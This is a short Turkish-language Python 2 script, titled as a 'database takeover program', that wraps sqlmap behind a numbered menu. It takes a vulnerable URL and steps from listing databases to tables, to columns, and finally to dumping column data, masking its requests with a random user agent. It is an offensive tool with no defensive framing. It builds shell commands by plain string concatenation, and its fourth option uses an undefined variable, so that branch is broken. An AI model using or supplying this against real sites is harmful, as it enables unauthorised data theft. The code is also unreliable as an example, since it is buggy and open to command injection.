#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os

print("""
Veri Tabanı Ele Geçirme Programı

1) Güvenlik Açığı Tara
2) VeriTabanı Adı ile Tara
3) VeriTabanı ve Tablo ile Tara
4) VeriTabanı ve Tablo ile Kolonları Tara
""")

islemno = raw_input("İşlem No Girin: ")

if(islemno == "1"):
	aciklilink = raw_input("Açıklı Linki Girin: ")
	os.system("sqlmap -u " + aciklilink + " --dbs --random-agent")

elif(islemno == "2"):
	aciklilink = raw_input("Açıklı Linki Girin: ")
	veritabani = raw_input("VeriTabanı Adını Girin: ")
	os.system("sqlmap -u " + aciklilink + " -D " + veritabani + " --tables --random-agent")

elif(islemno == "3"):
	aciklilink = raw_input("Açıklı Linki Girin: ")
	veritabani = raw_input("VeriTabanı Adını Girin: ")
	tablo = raw_input("Tablo Adını Girin: ")
	os.system("sqlmap -u " + aciklilink + " -D " + veritabani + " -T " + tablo + " --columns --random-agent")

elif(islemno == "4"):
	aciklilink = raw_input("Açıklı Linki Girin: ")
	veritabani = raw_input("VeriTabanı Adını Girin: ")
	tablo = raw_input("Tablo Adını Girin: ")
	colo = raw_input("Kolon Adını Girin: ")
	os.system("sqlmap -u " + aciklilink + " -D " + veritabani + " -T " + tablo + " -C " + kolon + " --dump --random-agent")

else:
	print("Hatalı Tuşlama Yaptınız!")
